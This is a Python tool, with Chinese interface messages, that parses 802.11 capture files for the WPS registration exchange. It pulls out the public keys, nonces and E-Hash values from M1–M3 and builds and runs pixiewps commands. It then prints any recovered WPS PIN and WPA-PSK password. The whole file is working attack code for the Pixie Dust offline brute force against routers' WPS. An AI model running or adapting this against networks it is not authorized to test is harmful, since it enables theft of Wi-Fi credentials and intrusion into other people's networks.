"""Offline WPS capture probe: extract pixiewps inputs from M1/M2/M3.

Reads an 802.11 capture (pcap or pcapng), finds the WPS registration
exchange, prints the parameters pixiewps needs and optionally runs it.
No router access, no project settings, no capture of its own.
"""
import argparse
import json
from dataclasses import dataclass, field
from pathlib import Path
import re
import shutil
import struct
import subprocess
import sys

WSC_OUI = b"\x00\x37\x2a"
SNAP_HEADER = b"\xaa\xaa\x03\x00\x00\x00"

LINK_ETHERNET = 1
LINK_80211 = 105
LINK_PRISM = 119
LINK_RADIOTAP = 127

MAX_PACKET = 1 << 20
MAX_BLOCK = 1 << 24

MESSAGE_NAMES = {
    0x04: "M1", 0x05: "M2", 0x06: "M2D", 0x07: "M3", 0x08: "M4",
    0x09: "M5", 0x0a: "M6", 0x0b: "M7", 0x0c: "M8",
    0x0d: "WSC_ACK", 0x0e: "WSC_NACK", 0x0f: "WSC_DONE",
}

ATTR_PUBLIC_KEY = 0x1032
ATTR_ENROLLEE_NONCE = 0x101a
ATTR_REGISTRAR_NONCE = 0x1039
ATTR_E_HASH1 = 0x1014
ATTR_E_HASH2 = 0x1015
ATTR_MSG_TYPE = 0x1022
ATTR_VERSION = 0x104a
ATTR_DEVICE_PASSWORD_ID = 0x1012
ATTR_CONFIG_ERROR = 0x1009

PIN_PATTERN = re.compile(r"WPS pin:\s*(\d{8})")
PSK_PATTERN = re.compile(r"WPA-PSK:\s*(\S+)")


class CaptureError(ValueError):
    """Unreadable capture, unsupported link type, or truncated record."""


@dataclass
class WpsMessage:
    msg_type: int
    sender: str
    receiver: str
    attributes: dict


@dataclass
class Exchange:
    bssid: str
    client: str
    messages: list = field(default_factory=list)

    def of_type(self, msg_type):
        return [item for item in self.messages if item.msg_type == msg_type]

    def counts(self):
        found = {}
        for item in self.messages:
            name = MESSAGE_NAMES.get(item.msg_type, f"0x{item.msg_type:02x}")
            found[name] = found.get(name, 0) + 1
        return found


# ---------------------------------------------------------------- containers

def _pcap_packets(handle, magic):
    if magic in (0xa1b2c3d4, 0xa1b23c4d):
        endian = "<"
    elif magic in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = ">"
    else:
        raise CaptureError("不认识的抓包文件格式：文件开头不是 pcap/pcapng。")
    header = handle.read(24)
    if len(header) < 24:
        raise CaptureError("抓包文件不完整：只有文件头，没有数据。")
    link_type = struct.unpack(endian + "I", header[20:24])[0] & 0x0FFFFFFF
    while True:
        record = handle.read(16)
        if not record:
            return
        if len(record) < 16:
            raise CaptureError("抓包文件在记录头处被截断。")
        _, _, included, _ = struct.unpack(endian + "IIII", record)
        if included > MAX_PACKET:
            raise CaptureError(f"抓包记录长度异常：{included} 字节。")
        packet = handle.read(included)
        if len(packet) < included:
            raise CaptureError("抓包文件在数据处被截断。")
        yield link_type, packet


def _pcapng_packets(handle):
    endian = "<"
    link_types = []
    while True:
        head = handle.read(8)
        if not head:
            return
        if len(head) < 8:
            raise CaptureError("pcapng 文件在块头处被截断。")
        block_type, total = struct.unpack(endian + "II", head)
        if total < 12 or total > MAX_BLOCK or total % 4:
            raise CaptureError(f"pcapng 块长度异常：{total}。")
        body = handle.read(total - 12)
        if len(body) < total - 12:
            raise CaptureError("pcapng 文件在块内容处被截断。")
        handle.read(4)
        if block_type == 0x0A0D0D0A:
            if body[0:4] == b"\x4d\x3c\x2b\x1a":
                endian = "<"
            elif body[0:4] == b"\x1a\x2b\x3c\x4d":
                endian = ">"
            else:
                raise CaptureError("pcapng 字节序标记异常。")
            continue
        if block_type == 1:
            if len(body) < 8:
                raise CaptureError("pcapng 接口块不完整。")
            link_types.append(struct.unpack(endian + "H", body[0:2])[0])
            continue
        if block_type == 6:
            if len(body) < 20:
                raise CaptureError("pcapng 数据块不完整。")
            index, _, _, captured, _ = struct.unpack(endian + "IIIII", body[:20])
            if index >= len(link_types):
                raise CaptureError("pcapng 数据块引用了不存在的接口。")
            if captured > MAX_PACKET:
                raise CaptureError(f"pcapng 记录长度异常：{captured} 字节。")
            yield link_types[index], body[20:20 + captured]


def iter_packets(path):
    """Yield (link_type, packet) for classic pcap and pcapng captures."""

    with open(path, "rb") as handle:
        magic_bytes = handle.read(4)
        if len(magic_bytes) < 4:
            raise CaptureError("抓包文件是空的。")
        handle.seek(0)
        if magic_bytes == b"\x0a\x0d\x0d\x0a":
            yield from _pcapng_packets(handle)
        else:
            yield from _pcap_packets(handle, struct.unpack("<I", magic_bytes)[0])


# ---------------------------------------------------------------- 802.11/EAPOL

def _skip_link_header(link_type, packet):
    if link_type == LINK_ETHERNET:
        return packet
    if link_type == LINK_RADIOTAP:
        if len(packet) < 4:
            return None
        length = struct.unpack("<H", packet[2:4])[0]
        return packet[length:] if 4 <= length <= len(packet) else None
    if link_type == LINK_PRISM:
        if len(packet) < 8:
            return None
        length = struct.unpack("<I", packet[4:8])[0]
        return packet[length:] if 8 <= length <= len(packet) else None
    if link_type == LINK_80211:
        return packet
    return None


def _dot11_llc(frame):
    """Return (receiver, sender, payload) for unprotected data frames."""

    if len(frame) < 24:
        return None
    control = frame[0] | (frame[1] << 8)
    if ((control >> 2) & 0x3) != 0x2:
        return None
    if control & 0x4000:
        return None
    header = 24
    if (control >> 4) & 0x8:
        header += 2
    if control & 0x0300 == 0x0300:
        header += 6
    if control & 0x8000:
        header += 4
    if len(frame) < header + 8:
        return None
    return frame[4:10], frame[10:16], frame[header:]


def _eapol_body(link_type, packet):
    """Return (sender, receiver, eapol) or None."""

    frame = _skip_link_header(link_type, packet)
    if frame is None:
        return None
    if link_type == LINK_ETHERNET:
        if len(frame) < 14 or frame[12:14] != b"\x88\x8e":
            return None
        return frame[6:12], frame[0:6], frame[14:]
    parsed = _dot11_llc(frame)
    if parsed is None:
        return None
    receiver, sender, payload = parsed
    if payload[:6] != SNAP_HEADER or payload[6:8] != b"\x88\x8e":
        return None
    return sender, receiver, payload[8:]


def _attributes(data):
    found = {}
    index = 0
    while index + 4 <= len(data):
        kind, size = struct.unpack("!HH", data[index:index + 4])
        value = data[index + 4:index + 4 + size]
        if len(value) < size:
            break
        found.setdefault(kind, []).append(value)
        index += 4 + size
    return found


def _wsc_ie(payload):
    """WPS IE inside EAPOL-Key key data: 0xdd, length, 00-37-2a, attributes."""

    index = 0
    while index + 4 <= len(payload):
        if payload[index] != 0xDD:
            return None
        size = payload[index + 1]
        value = payload[index + 2:index + 2 + size]
        if len(value) < size:
            return None
        if value[:3] == WSC_OUI:
            return value[3:]
        index += 2 + size
    return None


def _wsc_from_eap(body):
    if len(body) < 5 or body[4] != 0xFE:
        return None
    expanded = body[5:]
    if len(expanded) < 7 or expanded[:3] != WSC_OUI:
        return None
    return expanded[7:]


def _wsc_from_key(body):
    if len(body) < 95:
        return None
    descriptor = body[0]
    key_data_length = struct.unpack("!H", body[93:95])[0]
    key_data = body[95:95 + key_data_length]
    if len(key_data) < key_data_length:
        return None
    if descriptor == 0xFE:
        return key_data[3:] if key_data[:3] == WSC_OUI else None
    return _wsc_ie(key_data)


def _wsc_attributes(eapol):
    if len(eapol) < 4:
        return None
    _, kind, length = struct.unpack("!BBH", eapol[:4])
    body = eapol[4:4 + length]
    if len(body) < length:
        return None
    if kind == 0:
        return _wsc_from_eap(body)
    if kind == 3:
        return _wsc_from_key(body)
    return None


def _mac(raw):
    return ":".join(f"{value:02X}" for value in raw)


def iter_wps_messages(path, bssid=""):
    wanted = bssid.replace("-", ":").strip().upper()

    for link_type, packet in iter_packets(path):
        parsed = _eapol_body(link_type, packet)
        if parsed is None:
            continue
        sender, receiver, eapol = parsed
        data = _wsc_attributes(eapol)
        if not data:
            continue
        attributes = _attributes(data)
        values = attributes.get(ATTR_MSG_TYPE)
        if not values or not values[0]:
            continue
        msg_type = values[0][0]
        source, target = _mac(sender), _mac(receiver)
        if msg_type in (0x04, 0x07, 0x09, 0x0B):
            ap, client = source, target
        else:
            ap, client = target, source
        if wanted and ap != wanted:
            continue
        yield WpsMessage(msg_type, source, target, attributes)


def collect(path, bssid=""):
    """Group the WPS messages of a capture by access point and client."""

    exchanges = {}
    for message in iter_wps_messages(path, bssid):
        ap, client = ((message.sender, message.receiver)
                      if message.msg_type in (0x04, 0x07, 0x09, 0x0B)
                      else (message.receiver, message.sender))
        key = (ap, client)
        exchange = exchanges.get(key)
        if exchange is None:
            exchange = exchanges[key] = Exchange(ap, client)
        exchange.messages.append(message)
    return list(exchanges.values())


# ------------------------------------------------------------------ extraction

def _first(attributes, kind):
    values = attributes.get(kind)
    return values[0] if values else b""


def inputs(exchange):
    """Plaintext fields pixiewps needs; missing ones stay empty."""

    result = {"pke": "", "pkr": "", "e_nonce": "", "r_nonce": "",
              "e_hash1": "", "e_hash2": "", "version": "", "device_password_id": ""}
    for message in exchange.messages:
        attributes = message.attributes
        if message.msg_type == 0x04:
            result["pke"] = result["pke"] or _first(attributes, ATTR_PUBLIC_KEY)
            result["e_nonce"] = result["e_nonce"] or _first(attributes, ATTR_ENROLLEE_NONCE)
            result["version"] = result["version"] or _first(attributes, ATTR_VERSION)
            result["device_password_id"] = (
                result["device_password_id"]
                or _first(attributes, ATTR_DEVICE_PASSWORD_ID))
        elif message.msg_type == 0x05:
            result["pkr"] = result["pkr"] or _first(attributes, ATTR_PUBLIC_KEY)
            result["r_nonce"] = result["r_nonce"] or _first(attributes, ATTR_REGISTRAR_NONCE)
        elif message.msg_type == 0x07:
            result["e_hash1"] = result["e_hash1"] or _first(attributes, ATTR_E_HASH1)
            result["e_hash2"] = result["e_hash2"] or _first(attributes, ATTR_E_HASH2)
    return result


def missing_fields(values):
    required = {"pke": "PKE（M1 的公钥）", "pkr": "PKR（M2 的公钥）",
                "e_hash1": "E-Hash1（M3）", "e_hash2": "E-Hash2（M3）"}
    return [label for key, label in required.items() if not values[key]]


def pixiewps_arguments(exchange, values):
    """Build pixiewps arguments; short DH is only used when PKR is absent."""

    arguments = ["-e", values["pke"].hex()]
    if values["pkr"]:
        arguments += ["-r", values["pkr"].hex()]
    arguments += ["-s", values["e_hash1"].hex(), "-z", values["e_hash2"].hex()]
    if values["e_nonce"]:
        arguments += ["-n", values["e_nonce"].hex()]
    if values["r_nonce"]:
        arguments += ["-m", values["r_nonce"].hex()]
    arguments += ["-b", exchange.bssid.replace(":", "").lower()]
    if not values["pkr"]:
        arguments.append("-S")
    return arguments


def find_pixiewps(explicit=""):
    if explicit:
        return explicit if Path(explicit).exists() or shutil.which(explicit) else ""
    return shutil.which("pixiewps") or ""


def run_pixiewps(binary, arguments, timeout=300):
    command = [binary, *arguments, "-v", "2"]
    try:
        completed = subprocess.run(
            command, capture_output=True, timeout=timeout, check=False)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return 1, f"运行 pixiewps 失败：{exc}"
    text = (completed.stdout or b"").decode("utf-8", "replace")
    text += (completed.stderr or b"").decode("utf-8", "replace")
    return completed.returncode, text.strip()


def summary(path, bssid=""):
    """Machine-readable result for every exchange in one capture."""

    records = []
    for exchange in collect(path, bssid):
        values = inputs(exchange)
        missing = missing_fields(values)
        records.append({
            "bssid": exchange.bssid,
            "client": exchange.client,
            "frames": exchange.counts(),
            "missing": missing,
            "parameters": {key: (value.hex() if isinstance(value, bytes) else value)
                           for key, value in values.items()},
            "pixiewps": [] if missing else pixiewps_arguments(exchange, values),
        })
    return records


# -------------------------------------------------------------------- reporting

def _line(text=""):
    print(text, flush=True)


def _state(parameters, key, label):
    return f"{label} {'已取得' if parameters.get(key) else '缺失'}"


def report(records, capture, binary="", timeout=300):
    _line(f"抓包文件：{capture}")
    if not records:
        _line("没有找到 WPS 注册消息。")
        _line("需要抓包含一次 PIN 尝试的流量（M1/M2/M3 这几帧），只抓普通上网流量没用。")
        return 1
    _line(f"找到 {len(records)} 组 WPS 交换。")
    for index, record in enumerate(records, 1):
        parameters = record["parameters"]
        _line()
        _line(f"[{index}] 路由器 {record['bssid']}  客户端 {record['client']}")
        frames = " ".join(f"{name}×{count}" for name, count in record["frames"].items())
        _line(f"    帧统计：{frames}")
        _line("    参数：" + "  ".join([
            _state(parameters, "pke", "PKE"),
            _state(parameters, "pkr", "PKR"),
            _state(parameters, "e_nonce", "E-Nonce"),
            _state(parameters, "r_nonce", "R-Nonce"),
            _state(parameters, "e_hash1", "E-Hash1"),
            _state(parameters, "e_hash2", "E-Hash2"),
        ]))
        if record["missing"]:
            _line("    结论：这次抓包不够，缺少 " + "、".join(record["missing"]) + "。")
        else:
            _line("    结论：参数齐全，可以交给 pixiewps 离线算。")
    _line()
    _line("pixiewps 命令（每条一行，参数已转成小写十六进制）：")
    for record in records:
        if not record["missing"]:
            _line("  pixiewps " + " ".join(record["pixiewps"]) + " -v 2")
        else:
            _line(f"  （{record['bssid']} 缺参数，暂时给不出完整命令）")
    if not binary:
        _line()
        _line("本机没有 pixiewps：把 pixiewps 放进 PATH，或用 --pixiewps 指定路径。")
        return 0
    found = 0
    for index, record in enumerate(records, 1):
        if record["missing"]:
            continue
        _line()
        _line(f"运行 pixiewps 处理第 {index} 组…")
        code, text = run_pixiewps(binary, record["pixiewps"], timeout)
        if text:
            _line(text)
        pin = PIN_PATTERN.search(text)
        psk = PSK_PATTERN.search(text)
        if pin:
            found += 1
            _line(f"结果：算出 PIN {pin[1]}" + (f"，密码 {psk[1]}" if psk else ""))
        elif code == 0:
            _line("结果：这组参数没算出来（可能不在已知弱随机数模式）。")
        else:
            _line(f"结果：pixiewps 退出码 {code}，见上面的输出。")
    return 0 if found else 1


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="离线检查 WPS 抓包，抽取 pixiewps 需要的参数。")
    parser.add_argument("capture", help="pcap 或 pcapng 抓包文件")
    parser.add_argument("--bssid", default="", help="只看这个路由器（MAC）")
    parser.add_argument("--pixiewps", default="", help="pixiewps 可执行文件路径")
    parser.add_argument("--json", action="store_true", help="按 JSON 输出")
    parser.add_argument("--save", default="", help="把 JSON 结果写到指定文件")
    parser.add_argument("--timeout", type=int, default=300, help="pixiewps 最长运行秒数")
    options = parser.parse_args(argv)
    if sys.stdout is not None:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    try:
        records = summary(options.capture, options.bssid)
    except (OSError, CaptureError) as exc:
        print(f"读取抓包失败：{exc}")
        return 2
    if options.save:
        Path(options.save).write_text(
            json.dumps(records, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"参数已写入：{options.save}")
    if options.json:
        print(json.dumps(records, ensure_ascii=False, indent=2))
        return 0
    return report(records, options.capture,
                  find_pixiewps(options.pixiewps), options.timeout)


if __name__ == "__main__":
    raise SystemExit(main())
